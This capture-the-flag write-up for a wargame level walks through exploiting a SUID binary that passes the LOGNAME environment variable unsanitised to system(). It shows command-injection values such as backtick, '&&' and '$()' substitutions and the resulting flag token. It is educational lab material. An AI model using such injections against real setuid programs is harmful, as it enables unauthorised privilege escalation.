# level07

## Goal
Run `getflag` as `flag07` via the SUID binary in `~`.

## Recon
```sh
$ ls -l ~
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
$ strings ~/level07 | grep -E 'getenv|system|LOGNAME|/bin/echo'
getenv
system
LOGNAME
/bin/echo %s
```

The binary builds a command with `sprintf(buf, "/bin/echo %s ", getenv("LOGNAME"))`
and runs it with `system()`. So it executes `/bin/echo <LOGNAME>` as **flag07**, and
we fully control `LOGNAME`.

## Exploit - command injection through an environment variable
Put a shell command substitution in `LOGNAME`. It must reach the binary as a *literal*
`` `getflag` `` (single-quoted so no shell of ours evaluates it); the `system()` shell
spawned by the binary - running as flag07 - is what evaluates it:

```sh
$ LOGNAME='`getflag`' ~/level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

(`LOGNAME='&& getflag #'` or `$(getflag)` work equally well.)

## Result
- **level08 password (token):** `fiumuikeil55xe9cu4dood66h`
